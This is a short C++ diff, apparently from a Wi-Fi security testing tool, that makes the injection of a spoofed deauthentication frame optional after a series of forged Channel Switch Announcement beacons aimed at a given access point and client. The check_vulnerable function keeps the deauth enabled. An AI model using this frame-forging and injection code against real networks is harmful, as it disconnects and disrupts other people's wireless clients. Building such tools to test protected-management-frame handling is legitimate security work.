@@ -162,13 +162,14 @@ RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, c
 }
 
 vector<RadioTap> get_CSA_frames(const HWAddress<6> &ap_mac, const Channel &ap_channel,
-	const Channel &new_channel, const unique_ptr<Dot11Beacon> &beacon, const HWAddress<6> &sta_mac) {
+	const Channel &new_channel, const unique_ptr<Dot11Beacon> &beacon, const HWAddress<6> &sta_mac,
+	const bool add_deauth) {
 	vector<RadioTap> frames;
 	for(int c = CHANNEL_SWITCH_MAX; c >= 0; --c)
 		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()));
 	// after switch_count=0: inject unprotected Deauth
 	// to reliably trigger SA Query on ieee80211w=1 clients that only react reactively (not proactively after CSA)
-	frames.push_back(deauth_attack::make_deauth(ap_mac, sta_mac));
+	if(add_deauth) frames.push_back(deauth_attack::make_deauth(ap_mac, sta_mac));
 	return frames;
 }
 
@@ -210,7 +211,7 @@ void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, c
 		ap_channel.ch_num,
 		ssid);
 
-	vector<RadioTap> frames = get_CSA_frames(ap_mac, ap_channel, new_channel, beacon, sta_mac);
+	vector<RadioTap> frames = get_CSA_frames(ap_mac, ap_channel, new_channel, beacon, sta_mac, true);
 	while(steady_clock::now() < end_time) {
 		send_CSA_frames(sender, frames);
 		interruptible_sleep(milliseconds(ms_interval));
